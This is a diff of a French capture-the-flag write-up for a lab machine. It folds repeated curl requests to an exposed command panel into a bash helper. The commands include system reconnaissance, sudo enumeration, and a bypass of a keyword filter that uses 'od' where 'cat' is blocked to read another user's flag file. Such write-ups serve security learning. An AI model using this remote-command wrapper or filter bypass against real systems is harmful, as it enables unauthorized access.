@@ -120,8 +120,8 @@ gobuster dir -u http://10.10.0.30/ \
 
 ```
 login.php     (Status: 200)
-portal.php    (Status: 302) → /login.php
-forbidden.php (Status: 302) → /login.php
+portal.php    (Status: 302) -> /login.php
+forbidden.php (Status: 302) -> /login.php
 ```
 
 **Faille exploitée :** Pages non référencées mais accessibles ("security by obscurity") (CWE-425 : Direct Access to a Resource) -> les fichiers `.php` n'étaient liés depuis aucune page mais restaient accessibles publiquement.
@@ -166,12 +166,24 @@ Une fois décodé = "have you heard of a rabbit hole ? You should look it up, yo
 
 **Faille exploitée :** Exécution de commandes arbitraires exposée (Remote Command Execution volontaire mais faiblement filtrée) (CWE-78 : Improper Neutralization of Special Elements used in an OS Command) — la fonctionnalité elle-même est une porte d'entrée pour l'exécution de commandes système.
 
+**Optimisation / définition d'une fonction `run` :**
+
+Comme toutes les interactions avec le Shell Panel réutilisent la même requête POST vers `portal.php` (seule la commande change), on définit une fonction shell qui encapsule la partie répétitive. Cela remplace les longues lignes `curl` par un simple `run "<commande>"`.
+
+```bash
+run() {
+  curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
+    --data-urlencode "command=$1" \
+    --data-urlencode "sub=Execute" ;
+}
+```
+
+`"$1"` est le premier argument passé à `run`, injecté dans le champ `command`. Le cookie de session (`-b cookies.txt`) est conservé à chaque appel.
+
 **Test :**
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=whoami" \
-  --data-urlencode "sub=Execute"
+run "whoami"
 ```
 
 -> résultat : `www-data`
@@ -181,13 +193,7 @@ curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
 ## 8. Reconnaissance système via le Shell Panel
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=find /var/www -type f" \
-  --data-urlencode "sub=Execute"
-
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=ls -la /home" \
-  --data-urlencode "sub=Execute"
+run "ls -la /home"
 ```
 
 **Résultat clé :**
@@ -203,9 +209,7 @@ drwx------ 1 titouan titouan 4096 Aug 27 09:35 titouan
 ## 9. Escalade de privilèges via sudo -l
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=sudo -l" \
-  --data-urlencode "sub=Execute"
+run "sudo -l"
 ```
 
 **Résultat :**
@@ -224,9 +228,7 @@ User www-data may run the following commands on h4xx0r_pc:
 **Première tentative bloquée :**
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=sudo -u titouan cat /home/titouan/user.txt" \
-  --data-urlencode "sub=Execute"
+run "sudo -u titouan cat /home/titouan/user.txt"
 ```
 
 → _"Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious"_ (le mot-clé `cat` est filtré côté serveur)
@@ -236,9 +238,7 @@ curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
 **Contournement avec `od` (non filtré) :**
 
 ```bash
-curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
-  --data-urlencode "command=sudo -u titouan od -c /home/titouan/user.txt" \
-  --data-urlencode "sub=Execute"
+run "sudo -u titouan od -c /home/titouan/user.txt"
 ```
 
 **Résultat :**
